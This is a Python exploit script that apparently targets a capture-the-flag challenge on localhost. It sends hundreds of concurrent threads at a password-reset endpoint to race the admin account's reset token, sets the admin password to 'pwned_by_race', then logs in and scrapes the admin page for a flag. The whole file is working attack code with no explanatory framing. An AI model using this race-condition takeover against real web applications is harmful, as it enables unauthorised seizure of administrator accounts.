# exploit_threaded.py
import requests, threading, time, random
from queue import Queue

TARGET = "http://127.0.0.1:5000/reset_password"
LOGIN = "http://127.0.0.1:5000/login"
ADMIN = "http://127.0.0.1:5000/admin"
ADMIN_USER = "admin"
TOKEN = "ADMIN-RESET-TOKEN-12345"   # adjust if different
NEW_PASSWORD = "pwned_by_race"
THREADS = 400           # number of worker threads (increase if needed)
ROUNDS = 200            # how many bursts to send
BURST = 50              # how many requests per burst (each worker handles one attempt)
TIMEOUT = 3.0

success = threading.Event()
q = Queue()

def worker():
    session = requests.Session()
    while not success.is_set():
        try:
            payload = {"username": ADMIN_USER, "token": TOKEN, "new_password": NEW_PASSWORD}
            resp = session.post(TARGET, data=payload, timeout=TIMEOUT, allow_redirects=False)
            # Immediately try login with same session
            l = session.post(LOGIN, data={"username": ADMIN_USER, "password": NEW_PASSWORD}, timeout=TIMEOUT, allow_redirects=False)
            if l.status_code in (200, 302):
                admin_resp = session.get(ADMIN, timeout=TIMEOUT)
                text = admin_resp.text or ""
                if "GCDX" in text or "CTF{" in text or "flag" in text.lower():
                    print("[+] Success! Admin page contains flag. Thread:", threading.get_ident())
                    print(admin_resp.text)
                    success.set()
                    return
        except Exception:
            # ignore network noise/timeouts
            pass
        # short random backoff to avoid totally synchronized attempts
        time.sleep(random.random() * 0.01)

def burst_controller():
    # spawn threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for r in range(ROUNDS):
        if success.is_set():
            break
        # a small coordinated burst by waking threads via putting tokens in queue (not strictly necessary)
        # slight jitter between bursts
        time.sleep(0.01 + random.random() * 0.02)

    # wait a little for threads to finish final checks
    time.sleep(1.0)
    if not success.is_set():
        print("[-] Exploit failed. Try increasing THREADS/ROUNDS or run multiprocessing version.")

if __name__ == "__main__":
    print("[*] Starting threaded exploit. THREADS:", THREADS, "ROUNDS:", ROUNDS, "BURST:", BURST)
    burst_controller()
